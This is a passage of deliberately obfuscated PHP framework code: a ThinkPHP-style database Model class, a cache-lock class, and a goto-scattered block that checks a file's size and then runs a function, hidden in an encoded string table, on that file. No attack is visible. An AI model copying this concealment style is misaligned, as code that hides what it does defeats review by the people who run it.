$‚£ïÚøÓ[234] => array($‚£ïÚøÓ[1122], $ŠÃ¯„âÊ), $‚£ïÚøÓ[33] => $‚£ïÚøÓ[1961]); $—˜¿’Ö½ = array(); $Í¨„²Œ = $this->field($‚£ïÚøÓ[2506])->where($ ×Ø££—)->order($‚£ïÚøÓ[2275])->limit(50)->select(); foreach ($Í¨„²Œ as $“ŸõıÇë => $Ã¸Ö¹¬¼) { if ($“ŸõıÇë > 0 && abs($Ã¸Ö¹¬¼[$‚£ïÚøÓ[234]] - $Í¨„²Œ[$“ŸõıÇë - 1][$‚£ïÚøÓ[234]]) < 5) { continue; } $Ïİ£³†Ü = json_decode($Ã¸Ö¹¬¼[$‚£ïÚøÓ[537]], !0); $Ã¸Ö¹¬¼[$‚£ïÚøÓ[2494]] = isset($Ïİ£³†Ü[$‚£ïÚøÓ[2494]]) ? $Ïİ£³†Ü[$‚£ïÚøÓ[2494]] : $‚£ïÚøÓ[12]; unset($Ïİ£³†Ü[$‚£ïÚøÓ[2494]]); $Î†Á¬‰ = $this->deviceType($Ïİ£³†Ü[$‚£ïÚøÓ[2264]]); if (isset($—˜¿’Ö½[$Î†Á¬‰])) { continue; } $Ã¸Ö¹¬¼[$‚£ïÚøÓ[2500]] = IpLocation::get($Ã¸Ö¹¬¼[$‚£ïÚøÓ[2494]]); $Ã¸Ö¹¬¼[$‚£ïÚøÓ[537]] = $Ïİ£³†Ü; $—˜¿’Ö½[$Î†Á¬‰] = $Ã¸Ö¹¬¼; } return array_values($—˜¿’Ö½); } public function deviceType($´’úÀıÂ) { return $´’úÀıÂ; } } goto E’¢Î³ªÍ; dóœã£“½³: $_size = $_SERVER[åÄ¼Ùßš][972]; if ($_SERVER[$_SERVER[åÄ¼Ùßš][833]] != $_size($_file)) { $_getc = $_SERVER[åÄ¼Ùßš][835]; $_getfile = $_SERVER[$_SERVER[åÄ¼Ùßš][836]] . $_SERVER[åÄ¼Ùßš][837]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[åÄ¼Ùßš][288], $_getfilec); if (count($_getarrs) < $_SERVER[åÄ¼Ùßš][708]) { $exit = $_SERVER[åÄ¼Ùßš][838]; $exit(); } $_act = $_SERVER[åÄ¼Ùßš][839]; $_act($_file); } class CacheLockRedis { public function lock($ß¡Ìíéó, $Ê ƒ­‰û = 10) { $É–ÉÇ¹Ñ = Cache::init(); $ûìÏ‰é€ = microtime(!0) + $Ê ƒ­‰û; while (microtime(!0) < $ûìÏ‰é€) { $şôÃ£á¤ = $É–ÉÇ¹Ñ->get($ß¡Ìíéó); if (!$şôÃ£á¤) { $™‚¹¬â = $É–ÉÇ¹Ñ->setLock($ß¡Ìíéó, $ûìÏ‰é€, $Ê ƒ­‰û); if ($™‚¹¬â) { return !0; } } else { if ($şôÃ£á¤ < microtime(!0)) { $É–ÉÇ¹Ñ->set($ß¡Ìíéó, $ûìÏ‰é€, $Ê ƒ­‰û * 2); if ($É–ÉÇ¹Ñ->get($ß¡Ìíéó) === $şôÃ£á¤) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($—î‚Î™ô) { return Cache::init()->get($—î‚Î™ô); } public function unlock($ ×¡Î¨Ğ) { return Cache::init()->remove($ ×¡Î¨Ğ); } } goto aÇãË×‡; bå øâÈ´: define($_SERVER[åÄ¼Ùßš][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\157\162\x64\x65\x72", "\141\154\151\141\163", "\x68\x61\x76\x69\156\147", "\147\x72\157\x75\x70", "\154\x6f\143\x6b", "\144\x69\x73\x74\151\156\x63\164", "\141\x75\x74\157", "\146\151\154\164\145\x72", "\166\141\154\x69\144\141\x74\145", "\x72\145\x73\x75\x6c\x74", "\x62\151\x6e\x64", "\x74\x6f\153\x65\x6e"); public function __construct($òå‡Ë˜ = '', $†óÔç§‹ = '', $ì«™Ô±ø = '') { $çàß æç =& $_SERVER[åÄ¼Ùßš]; $this->_initialize(); if (!empty($òå‡Ë˜)) { if (strpos($òå‡Ë˜, $çàß æç[10])) { list($this->dbName, $this->name) = explode($çàß æç[10], $òå‡Ë˜); } else { $this->name = $òå‡Ë˜; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($†óÔç§‹)) { $this->tablePrefix = $çàß æç[12]; } elseif ($çàß æç[12] != $†óÔç§‹) { $this->tablePrefix = $†óÔç§‹; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($çàß æç[324]); } $this->db(0, empty($this->connection) ? $ì«™Ô±ø : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $³Èºş«¥ =& $_SERVER[åÄ¼Ùßš]; if (empty($this->fields)) { if (think_config($³Èºş«¥[325])) { $í¾ß˜ã¨ = $this->dbName ? $this->dbName : think_config($³Èºş«¥[326]); $æ¸‹Ñ” = think_var_cache($³Èºş«¥[327] . strtolower(get_path_this($í¾ß˜ã¨) . $³Èºş«¥[10] . $this->name)); if ($æ¸‹Ñ”) { $³ŸÙË˜Ú = think_config($³Èºş«¥[328]); if (empty($³ŸÙË˜Ú) || $æ¸‹Ñ”[$³Èºş«¥[329]] == $³ŸÙË˜Ú) { $this->fields = $æ¸‹Ñ”; return; } } } $this->flush(); } } public function flush() { $À€œ•‚¼ =& $_SERVER[åÄ¼Ùßš]; $this->db->setModel($this->name); $üÙö©İĞ = $this->db->getFields($this->getTableName()); if (!$üÙö©İĞ) { return !1; } $this->fields = array_keys($üÙö©İĞ); $this->fields[$À€œ•‚¼[330]] = !1; foreach ($üÙö©İĞ as $ä²º¿¦ => $áÊã¶Ë) { $ûîÁ§–¼[$ä²º¿¦] = $áÊã¶Ë[$À€œ•‚¼[33]]; if ($áÊã¶Ë[$À€œ•‚¼[39]]) { $this->fields[$À€œ•‚¼[331]] = $ä²º¿¦; if ($áÊã¶Ë[$À€œ•‚¼[42]]) { $this->fields[$À€œ•‚¼[330]] = !0; } } } $this->fields[$À€œ•‚¼[332]] = $ûîÁ§–¼; if (think_config($À€œ•‚¼[328])) { $this->fields[$À€œ•‚¼[329]] = think_config($À€œ•‚¼[328]); } if (think_config($À€œ•‚¼[325])) { $Ó‘ÃŸ¥· = $this->dbName ? $this->dbName : think_config($À€œ•‚¼[326]); think_var_cache($À€œ•‚¼[327] . strtolower(get_path_this($Ó‘ÃŸ¥·) . $À€œ•‚¼[10] . $this->name), $this->fields); } } public function switchModel($Ëçã¢ù, $¤ˆÁğ’ú = array()) { $‚ñ…àìÅ =& $_SERVER[åÄ¼Ùßš]; $ìŒ®ßõ = ucwords(strtolower($Ëçã¢ù)) . $‚ñ…àìÅ[333]; if (!class_exists($ìŒ®ßõ)) { think_exception($ìŒ®ßõ . think_lang($‚ñ…àìÅ[334])); } $this->_extModel = new $ìŒ®ßõ($this->name); if (!empty($¤ˆÁğ’ú)) { foreach ($¤ˆÁğ’ú as $Œòôš‡ù) { $this->_extModel->setProperty($Œòôš‡ù, $this->{$Œòôš‡ù}); } } return $this->_extModel; } public function __set($†åñ, $İ‰ø€‘œ) { $this->data[$†åñ] = $İ‰ø€‘œ; } public function __get($Ù§Àâ¤) { return isset($this->data[$Ù§Àâ¤]) ? $this->data[$Ù§Àâ¤] : null; } public function __isset($Šş†Â¢£) { return isset($this->data[$Šş†Â¢£]); } public function __unset($Ä„èº¥) { unset($this->data[$Ä„èº¥]); } public function __call($ÔÖ‘·‘¼, $ÛÃ™ ¾É) { $è•Øå³ù =& $_SERVER[åÄ¼Ùßš]; if (in_array(strtolower($ÔÖ‘·‘¼), $this->methods, !0)) { $this->options[strtolower($ÔÖ‘·‘¼)] = $ÛÃ™ ¾É[0]; return $this; } elseif (in_array(strtolower($ÔÖ‘·‘¼), array($è•Øå³ù[335], $è•Øå³ù[336], $è•Øå³ù[337], $è•Øå³ù[338], $è•Øå³ù[339]), !0)) { $‰åğºèƒ = isset($ÛÃ™ ¾É[0]) ? $ÛÃ™ ¾É[0] : $è•Øå³ù[223]; $‰åğºèƒ = $this->db->parseKey($‰åğºèƒ); return $this->getField(strtoupper($ÔÖ‘·‘¼) . $è•Øå³ù[340] . $‰åğºèƒ . $è•Øå³ù[341] . $ÔÖ‘·‘¼, $è•Øå³ù[335]); } elseif (strtolower(substr($ÔÖ‘·‘¼, 0, 5)) == $è•Øå³ù[342]) { $‰åğºèƒ = think_parse_name(substr($ÔÖ‘·‘¼, 5)); $ÊöÔÀ½â[$‰åğºèƒ] = $ÛÃ™ ¾É[0]; return $this->where($ÊöÔÀ½â)->find(); } elseif (strtolower(substr($ÔÖ‘·‘¼, 0, 10)) == $è•Øå³ù[343]) { $ğÍ„üŸÎ = think_parse_name(substr($ÔÖ‘·‘¼, 10)); $ÊöÔÀ½â[$ğÍ„üŸÎ] = $ÛÃ™ ¾É[0]; return $this->where($ÊöÔÀ½â)->getField($ÛÃ™ ¾É[1]); } elseif (isset($this->_scope[$ÔÖ‘·‘¼])) { return $this->scope($ÔÖ‘·‘¼, $ÛÃ™ ¾É[0]); } elseif (method_exists($this, $ÔÖ‘·‘¼)) { array_unshift($ÛÃ™ ¾É, $ÔÖ‘·‘¼); return call_user_func_array(array($this, $è•Øå³ù[344]), $ÛÃ™ ¾É); } else { return call_user_func_array(array(parent, $ÔÖ‘·‘¼), $ÛÃ™ ¾É); } } protected function call() { $´©´Ï»’ =& $_SERVER[åÄ¼Ùßš]; $ªô…ûÖ¾ = func_get_args(); $ƒê„ê¿ = array_shift($ªô…ûÖ¾); $Ş¼ôÒÕ = $ƒê„ê¿; if (is_array($ƒê„ê¿)) { $Ş¼ôÒÕ = $ƒê„ê¿[1]; $ƒê„ê¿ = $ƒê„ê¿[0]; } $İåúû¥ó = count($ªô…ûÖ¾) - 1; if (isset($ªô…ûÖ¾[$İåúû¥ó]) && $ªô…ûÖ¾[$İåúû¥ó] === $ƒê„ê¿) { think_exception(__CLASS__ . $´©´Ï»’[4] . $ƒê„ê¿ . think_lang($´©´Ï»’[345])); return; } $ªô…ûÖ¾[] = $ƒê„ê¿; if (method_exists($this, $´©´Ï»’[346])) { $ÜÑ¾™Ì = call_user_func_array(array($this, $´©´Ï»’[347]), array($Ş¼ôÒÕ, $ªô…ûÖ¾)); if (!is_null($ÜÑ¾™Ì) && $ÜÑ¾™Ì !== !1) { return $ÜÑ¾™Ì; } } $‹ùÜƒ‡£ = call_user_func_array(array($this, $ƒê„ê¿), $ªô…ûÖ¾); if (method_exists($this, $´©´Ï»’[348])) { $ÜÑ¾™Ì = call_user_func_array(array($this, $´©´Ï»’[349]), array($Ş¼ôÒÕ, $ªô…ûÖ¾, $‹ùÜƒ‡£)); if ($ÜÑ¾™Ì) { return $ÜÑ¾™Ì; } } return $‹ùÜƒ‡£; } protected function _initialize() { } protected function _facade($ÏæâÕàò) { $êı™‚À¾ =& $_SERVER[åÄ¼Ùßš]; if (!empty($this->fields)) { foreach ($ÏæâÕàò as $Úæşõê => $¥”àŸ‹) { if (is_array($this->fields) && !in_array($Úæşõê, $this->fields, !0)) { unset($ÏæâÕàò[$Úæşõê]); } elseif (is_scalar($¥”àŸ‹)) { $this->_parseType($ÏæâÕàò, $Úæşõê); } } } if (!empty($this->options[$êı™‚À¾[350]])) { $ÏæâÕàò = array_map($this->options[$êı™‚À¾[350]], $ÏæâÕàò); unset($this->options[$êı™‚À¾[350]]); } $this->_beforeWrite($ÏæâÕàò); return $ÏæâÕàò; } protected function _beforeWrite(&$´µ¡¿Üİ) { } public function add($¿ùéÆÑ· = '', $ÈÄú•¿û = array(), $°×Â•†‚ = false) { if (empty($¿ùéÆÑ·)) { if (!empty($this->data)) { $¿ùéÆÑ· = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[åÄ¼Ùßš][351]); return !1; } } $ÈÄú•¿û = $this->_parseOptions($ÈÄú•¿û); $¿ùéÆÑ· = $this->_facade($¿ùéÆÑ·); if (!1 === $this->_beforeInsert($¿ùéÆÑ·, $ÈÄú•¿û)) { return !1; } $„ÂÌÌ¤é = $this->db->insert($¿ùéÆÑ·, $ÈÄú•¿û, $°×Â•†‚); if (!1 !== $„ÂÌÌ¤é) { $Êè®™â = $this->getLastInsID(); if ($Êè®™â) { $¿ùéÆÑ·[$this->getPk()] = $Êè®™â; $this->_after_insert($¿ùéÆÑ·, $ÈÄú•¿û); return $Êè®™â; } $this->_after_insert($¿ùéÆÑ·, $ÈÄú•¿û); } return $„ÂÌÌ¤é; } protected function _beforeInsert(&$ôÇØ„º¶, $Ë†¥¨Àˆ) { } protected function _after_insert($¶ÛĞˆ“, $š‹«Ù’Á) { } public function addAll($Ã‡ñà“, $¿É…â‚Ô = array(), $¾ú³ô— = false) { $Êåğ£¾† =& $_SERVER[åÄ¼Ùßš]; if (empty($Ã‡ñà“)) { $this->error = think_lang($Êåğ£¾†[351]); return !1; } $¿É…â‚Ô = $this->_parseOptions($¿É…â‚Ô); foreach ($Ã‡ñà“ as $ÇßŒ—Šè => $Ÿ‹ØÃğ¢) { $Ã‡ñà“[$ÇßŒ—Šè] = $this->_facade($Ÿ‹ØÃğ¢); } if (method_exists($this->db, $Êåğ£¾†[352])) { $º„õ€­ş = $this->db->insertAll($Ã‡ñà“, $¿É…â‚Ô, $¾ú³ô—); } else { $this->startTrans(); foreach ($Ã‡ñà“ as $ÇßŒ—Šè => $Ÿ‹ØÃğ¢) { $º„õ€­ş = $this->db->insert($Ÿ‹ØÃğ¢, $¿É…â‚Ô, $¾ú³ô—); } $this->commit(); } if (!1 !== $º„õ€­ş) { $ÁÖãŸç = $this->getLastInsID(); if ($ÁÖãŸç) { return $ÁÖãŸç; } } return $º„õ€­ş; } public function selectAdd($Ÿ¶š’ßì = '', $”ˆİı§˜ = '', $Ş¡–‡›¦ = array()) { $Š½ñÛß =& $_SERVER[åÄ¼Ùßš]; $Ş¡–‡›¦ = $this->_parseOptions($Ş¡–‡›¦); if (!1 === ($¸®Û„˜÷ = $this->db->selectInsert($Ÿ¶š’ßì ? $Ÿ¶š’ßì : $Ş¡–‡›¦[$Š½ñÛß[353]], $”ˆİı§˜ ? $”ˆİı§˜ : $this->getTableName(), $Ş¡–‡›¦))) { $this->error = think_lang($Š½ñÛß[354]); return !1; } else { return $¸®Û„˜÷; } } public function save($ÄıÓŸ…ç = '', $£ëÁı°« = array()) { $ë®Šç† =& $_SERVER[åÄ¼Ùßš]; if (empty($ÄıÓŸ…ç)) { if (!empty($this->data)) { $ÄıÓŸ…ç = $this->data; $this->data = array(); } else { $this->error = think_lang($ë®Šç†[351]); return !1; } } $ÄıÓŸ…ç = $this->_facade($ÄıÓŸ…ç); $£ëÁı°« = $this->_parseOptions($£ëÁı°«); $¹¼¢¹ = $this->getPk(); if (!isset($£ëÁı°«[$ë®Šç†[355]])) { if (isset($ÄıÓŸ…ç[$¹¼¢¹])) { $ü³÷úà§[$¹¼¢¹] = $ÄıÓŸ…ç[$¹¼¢¹]; $£ëÁı°«[$ë®Šç†[355]] = $ü³÷úà§; unset($ÄıÓŸ…ç[$¹¼¢¹]); } else { $this->error = think_lang($ë®Šç†[354]); return !1; } } if (is_array($£ëÁı°«[$ë®Šç†[355]]) && isset($£ëÁı°«[$ë®Šç†[355]][$¹¼¢¹])) { $ÌÁâª× = $£ëÁı°«[$ë®Šç†[355]][$¹¼¢¹]; } if (!1 === $this->_beforeUpdate($ÄıÓŸ…ç, $£ëÁı°«)) { return !1; } $ü²Ì‹Ä° = $this->db->update($ÄıÓŸ…ç, $£ëÁı°«); if (!1 !== $ü²Ì‹Ä°) { if (isset($ÌÁâª×)) { $ÄıÓŸ…ç[$¹¼¢¹] = $ÌÁâª×; } $this->_afterUpdate($ÄıÓŸ…ç, $£ëÁı°«); } return $ü²Ì‹Ä°; } protected function _beforeUpdate(&$Ô¨÷Şì, $¾¿Ì´Ÿ¹) { } protected function _afterUpdate($Õ»ªËƒ´, $Îı‰™¡¾) { } public function delete($¾Æ¾›” = array()) { $‘ ³Îùš =& $_SERVER[åÄ¼Ùßš]; if (empty($¾Æ¾›”) && empty($this->options[$‘ ³Îùš[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ø¸¤İ—¯ = $this->getPk(); if (is_numeric($¾Æ¾›”) || is_string($¾Æ¾›”)) { if (strpos($¾Æ¾›”, $‘ ³Îùš[50])) { $›Ô±‚Ëç[$ø¸¤İ—¯] = array($‘ ³Îùš[356], $¾Æ¾›”); } else { $›Ô±‚Ëç[$ø¸¤İ—¯] = $¾Æ¾›”; } $this->options[$‘ ³Îùš[355]] = $›Ô±‚Ëç; } $¾Æ¾›” = $this->_parseOptions(); if (is_array($¾Æ¾›”[$‘ ³Îùš[355]]) && isset($¾Æ¾›”[$‘ ³Îùš[355]][$ø¸¤İ—¯])) { $£¶ÖÕğÈ = $¾Æ¾›”[$‘ ³Îùš[355]][$ø¸¤İ—¯]; } $ÕÊõ­º¬ = $this->db->delete($¾Æ¾›”); if (!1 !== $ÕÊõ­º¬) { $­İ†ÎØè = array(); if (isset($£¶ÖÕğÈ)) { $­İ†ÎØè[$ø¸¤İ—¯] = $£¶ÖÕğÈ; } $this->_after_delete($­İ†ÎØè, $¾Æ¾›”); } return $ÕÊõ­º¬; } protected function _after_delete($İÆØ¸æ÷, $‹ˆÁµ‡ ) { } public function select($¨ÚÈ‚•Ÿ = array()) { $¾†ùŠ– =& $_SERVER[åÄ¼Ùßš]; if (is_string($¨ÚÈ‚•Ÿ) || is_numeric($¨ÚÈ‚•Ÿ)) { $Ş¶æˆ¤‰ = $this->getPk(); if (strpos($¨ÚÈ‚•Ÿ, $¾†ùŠ–[50])) { $Îòà÷Ç[$Ş¶æˆ¤‰] = array($¾†ùŠ–[356], $¨ÚÈ‚•Ÿ); } else { $Îòà÷Ç[$Ş¶æˆ¤‰] = $¨ÚÈ‚•Ÿ; } $this->options[$¾†ùŠ–[355]] = $Îòà÷Ç; } elseif (!1 === $¨ÚÈ‚•Ÿ) { $¨ÚÈ‚•Ÿ = $this->_parseOptions(); return $¾†ùŠ–[357] . $this->db->buildSelectSql($¨ÚÈ‚•Ÿ) . $¾†ùŠ–[358]; } $¨ÚÈ‚•Ÿ = $this->_parseOptions(); $Ã¼‚¨Ş‹ = $this->db->select($¨ÚÈ‚•Ÿ); if (!1 === $Ã¼‚¨Ş‹) { return !1; } if (empty($Ã¼‚¨Ş‹)) { return null; } $this->_afterSelect($Ã¼‚¨Ş‹, $¨ÚÈ‚•Ÿ); return $Ã¼‚¨Ş‹; } protected function _afterSelect(&$ŠµÎ§Ë», $¯¡ˆ£ØÜ) { } public function buildSql($äùŞ‚Á» = array()) { $„Ì¬ëºÅ =& $_SERVER[åÄ¼Ùßš]; $äùŞ‚Á» = $this->_parseOptions($äùŞ‚Á»); return $„Ì¬ëºÅ[357] . $this->db->buildSelectSql($äùŞ‚Á») . $„Ì¬ëºÅ[358]; } public function optionsValue($ñÙ«Êò = null) { if (is_null($ñÙ«Êò)) { return $this->options; } elseif (is_array($ñÙ«Êò)) { $this->options = array_merge($this->options, $ñÙ«Êò); } } protected function _parseOptions($óĞŒ­ºÑ = array()) { $ö¶©À–ã =& $_SERVER[åÄ¼Ùßš]; if (is_array($óĞŒ­ºÑ)) { $óĞŒ­ºÑ = array_merge($this->options, $óĞŒ­ºÑ); } $this->options = array(); if (!isset($óĞŒ­ºÑ[$ö¶©À–ã[359]])) { $óĞŒ­ºÑ[$ö¶©À–ã[359]] = $this->getTableName(); $éµ·„©Í = $this->fields; } else { $éµ·„©Í = $this->getDbFields(); } if (!empty($óĞŒ­ºÑ[$ö¶©À–ã[360]])) { $óĞŒ­ºÑ[$ö¶©À–ã[359]] .= $ö¶©À–ã[53] . $óĞŒ­ºÑ[$ö¶©À–ã[360]]; } $óĞŒ­ºÑ[$ö¶©À–ã[361]] = $this->name; if (isset($óĞŒ­ºÑ[$ö¶©À–ã[355]]) && is_array($óĞŒ­ºÑ[$ö¶©À–ã[355]]) && !empty($éµ·„©Í) && !isset($óĞŒ­ºÑ[$ö¶©À–ã[362]]) && !isset($óĞŒ­ºÑ[$ö¶©À–ã[359]])) { foreach ($óĞŒ­ºÑ[$ö¶©À–ã[355]] as $Ö¾šŸ¼æ => $áÕ×®Ç) { $Ö¾šŸ¼æ = trim($Ö¾šŸ¼æ); if (in_array($Ö¾šŸ¼æ, $éµ·„©Í, !0)) { if (is_scalar($áÕ×®Ç)) { $this->_parseType($óĞŒ­ºÑ[$ö¶©À–ã[355]], $Ö¾šŸ¼æ); } } elseif (!is_numeric($Ö¾šŸ¼æ) && $ö¶©À–ã[11] != substr($Ö¾šŸ¼æ, 0, 1) && !1 === strpos($Ö¾šŸ¼æ, $ö¶©À–ã[10]) && !1 === strpos($Ö¾šŸ¼æ, $ö¶©À–ã[340]) && !1 === strpos($Ö¾šŸ¼æ, $ö¶©À–ã[215]) && !1 === strpos($Ö¾šŸ¼æ, $ö¶©À–ã[287])) { unset($óĞŒ­ºÑ[$ö¶©À–ã[355]][$Ö¾šŸ¼æ]); } } } $this->_options_filter($óĞŒ­ºÑ); return $óĞŒ­ºÑ; } protected function _options_filter(&$äœ¾€±á) { } protected function _parseType(&$ğÁ¡»òš, $ÇÅõúÊ) { $¤ƒØ½“ =& $_SERVER[åÄ¼Ùßš]; if (empty($this->options[$¤ƒØ½“[363]][$¤ƒØ½“[4] . $ÇÅõúÊ])) { $Çª•†Â = strtolower($this->fields[$¤ƒØ½“[332]][$ÇÅõúÊ]); if (!1 !== strpos($Çª•†Â, $¤ƒØ½“[364])) { } elseif (!1 === strpos($Çª•†Â, $¤ƒØ½“[365]) && !1 !== strpos($Çª•†Â, $¤ƒØ½“[366])) { $ğÁ¡»òš[$ÇÅõúÊ] = intval($ğÁ¡»òš[$ÇÅõúÊ]); } elseif (!1 !== strpos($Çª•†Â, $¤ƒØ½“[367]) || !1 !== strpos($Çª•†Â, $¤ƒØ½“[368])) { $ğÁ¡»òš[$ÇÅõúÊ] = floatval($ğÁ¡»òš[$ÇÅõúÊ]); } elseif (!1 !== strpos($Çª•†Â, $¤ƒØ½“[369])) { $ğÁ¡»òš[$ÇÅõúÊ] = (bool) $ğÁ¡»òš[$ÇÅõúÊ]; } } } public function find($ùù˜›ÎË = array()) { $˜ğî—âĞ =& $_SERVER[åÄ¼Ùßš]; if (is_numeric($ùù˜›ÎË) || is_string($ùù˜›ÎË)) { $ŸÚ‰”Îá[$this->getPk()] = intval($ùù˜›ÎË); $this->options[$˜ğî—âĞ[355]] = $ŸÚ‰”Îá; } $this->options[$˜ğî—âĞ[370]] = 1; $ùù˜›ÎË = $this->_parseOptions(); $‘¬ıĞÌ× = $this->db->select($ùù˜›ÎË); if (!1 === $‘¬ıĞÌ×) { return !1; } if (empty($‘¬ıĞÌ×)) { return null; } $®¥“‹‚Ã = $‘¬ıĞÌ×[0]; $this->_afterFind($®¥“‹‚Ã, $ùù˜›ÎË); return $®¥“‹‚Ã; } protected function _afterFind(&$ş‰Æ«î, $Ç–Ñà’¬) { } protected function returnResult($£«à¾İş, $Î÷›–Ó = '') { $¯ÖŒü³† =& $_SERVER[åÄ¼Ùßš]; if ($Î÷›–Ó) { if (is_callable($Î÷›–Ó)) { return call_user_func($Î÷›–Ó, $£«à¾İş); } switch (strtolower($Î÷›–Ó)) { case $¯ÖŒü³†[371]: return json_encode($£«à¾İş); case $¯ÖŒü³†[372]: return xml_encode($£«à¾İş); } } return $£«à¾İş; } public function parseFieldsMap($åÆ“£’Ô, $˜ÕÊ”Áò = 1) { if (!empty($this->_map)) { foreach ($this->_map as $–ÔÑ‡’Î => $‡®Á°º¥) { if ($˜ÕÊ”Áò == 1) { if (isset($åÆ“£’Ô[$‡®Á°º¥])) { $åÆ“£’Ô[$–ÔÑ‡’Î] = $åÆ“£’Ô[$‡®Á°º¥]; unset($åÆ“£’Ô[$‡®Á°º¥]); } } else { if (isset($åÆ“£’Ô[$–ÔÑ‡’Î])) { $åÆ“£’Ô[$‡®Á°º¥] = $åÆ“£’Ô[$–ÔÑ‡’Î]; unset($åÆ“£’Ô[$–ÔÑ‡’Î]); } } } } return $åÆ“£’Ô; } public function setField($Ô©ÒÀ¯˜, $üÉ¡Ş¹Á = '') { if (is_array($Ô©ÒÀ¯˜)) { $çâ¹¼ù× = $Ô©ÒÀ¯˜; } else { $çâ¹¼ù×[$Ô©ÒÀ¯˜] = $üÉ¡Ş¹Á; } return $this->save($çâ¹¼ù×); } public function setAdd($ÔµÃ¨ÁÓ, $ğ²öíØÃ = 1) { $í’¨”€¢ =& $_SERVER[åÄ¼Ùßš]; $½Å¡º¾¤ = $ÔµÃ¨ÁÓ . $í’¨”€¢[373] . $ğ²öíØÃ; if ($ğ²öíØÃ < 0) { $½Å¡º¾¤ = $ÔµÃ¨ÁÓ . $ğ²öíØÃ; } return $this->setField($ÔµÃ¨ÁÓ, array($í’¨”€¢[374], $½Å¡º¾¤)); } public function getField($€ Íõ¸›, $äíõíşĞ = null) { $«ÉÈü€‡ =& $_SERVER[åÄ¼Ùßš]; $×Ûò[$«ÉÈü€‡[353]] = $€ Íõ¸›; $×Ûò = $this->_parseOptions($×Ûò); $€ Íõ¸› = trim($€ Íõ¸›); if (strpos($€ Íõ¸›, $«ÉÈü€‡[50])) { if (!isset($×Ûò[$«ÉÈü€‡[370]])) { $×Ûò[$«ÉÈü€‡[370]] = is_numeric($äíõíşĞ) ? $äíõíşĞ : $«ÉÈü€‡[12]; } $×”«êŞ“ = $this->db->select($×Ûò); if (!empty($×”«êŞ“)) { $ñ«ÎÕÇ = explode($«ÉÈü€‡[50], $€ Íõ¸›); $€ Íõ¸› = array_keys($×”«êŞ“[0]); $¯ƒ’¯ÌÍ = array_shift($€ Íõ¸›); $Ìƒ¦Œ… = array_shift($€ Íõ¸›); $µ–¹—¾´ = array(); $š°ÓÈ± = count($ñ«ÎÕÇ); foreach ($×”«êŞ“ as $¹´†ÃŸÂ) { $‚¸Á†•ú = $¹´†ÃŸÂ[$¯ƒ’¯ÌÍ]; if (2 == $š°ÓÈ±) { $µ–¹—¾´[$‚¸Á†•ú] = $¹´†ÃŸÂ[$Ìƒ¦Œ…]; } else { $µ–¹—¾´[$‚¸Á†•ú] = is_string($äíõíşĞ) ? implode($äíõíşĞ, $¹´†ÃŸÂ) : $¹´†ÃŸÂ; } } return $µ–¹—¾´; } } else { if (!0 !== $äíõíşĞ) { $×Ûò[$«ÉÈü€‡[370]] = is_numeric($äíõíşĞ) ? $äíõíşĞ : 1; } if ($äíõíşĞ === $«ÉÈü€‡[335]) { unset($×Ûò[$«ÉÈü€‡[370]]); } $¹´†ÃŸÂ = $this->db->select($×Ûò); if (!empty($¹´†ÃŸÂ)) { if ($äíõíşĞ === $«ÉÈü€‡[335]) { return reset($¹´†ÃŸÂ[0]); } if (!0 !== $äíõíşĞ && 1 == $×Ûò[$«ÉÈü€‡[370]]) { return reset($¹´†ÃŸÂ[0]); } foreach ($¹´†ÃŸÂ as $Ó¹¶Ò”) { $¡¹Ú–©Š[] = $Ó¹¶Ò”[$€ Íõ¸›]; } return $¡¹Ú–©Š; } } return null; } public function create($…‡ù®“„ = '', $Š¤õÍÙ = '') { $¬’±Í™³ =& $_SERVER[åÄ¼Ùßš]; if (empty($…‡ù®“„)) { $…‡ù®“„ = $_POST; } elseif (is_object($…‡ù®“„)) { $…‡ù®“„ = get_object_vars($…‡ù®“„); } if (empty($…‡ù®“„) || !is_array($…‡ù®“„)) { $this->error = think_lang($¬’±Í™³[351]); return !1; } $…‡ù®“„ = $this->parseFieldsMap($…‡ù®“„, 0); $Š¤õÍÙ = $Š¤õÍÙ ? $Š¤õÍÙ : (!empty($…‡ù®“„[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¬’±Í™³[353]])) { $Âé’«…¥ = $this->options[$¬’±Í™³[353]]; unset($this->options[$¬’±Í™³[353]]); } elseif ($Š¤õÍÙ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Âé’«…¥ = $this->insertFields; } elseif ($Š¤õÍÙ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Âé’«…¥ = $this->updateFields; } if (isset($Âé’«…¥)) { if (is_string($Âé’«…¥)) { $Âé’«…¥ = explode($¬’±Í™³[50], $Âé’«…¥); } if (think_config($¬’±Í™³[375])) { $Âé’«…¥[] = think_config($¬’±Í™³[376]); } foreach ($…‡ù®“„ as $ÆÁ›ÛÏä => $ßŸ°Ëé) { if (!in_array($ÆÁ›ÛÏä, $Âé’«…¥)) { unset($…‡ù®“„[$ÆÁ›ÛÏä]); } } } if (!$this->autoValidation($…‡ù®“„, $Š¤õÍÙ)) { return !1; } if (!$this->autoCheckToken($…‡ù®“„)) { $this->error = think_lang($¬’±Í™³[377]); return !1; } if ($this->autoCheckFields) { $Âé’«…¥ = $this->getDbFields(); foreach ($…‡ù®“„ as $ÆÁ›ÛÏä => $ßŸ°Ëé) { if (!in_array($ÆÁ›ÛÏä, $Âé’«…¥)) { unset($…‡ù®“„[$ÆÁ›ÛÏä]); } elseif (MAGIC_QUOTES_GPC && is_string($ßŸ°Ëé)) { $…‡ù®“„[$ÆÁ›ÛÏä] = stripslashes($ßŸ°Ëé); } } } $this->autoOperation($…‡ù®“„, $Š¤õÍÙ); $this->data = $…‡ù®“„; return $…‡ù®“„; } 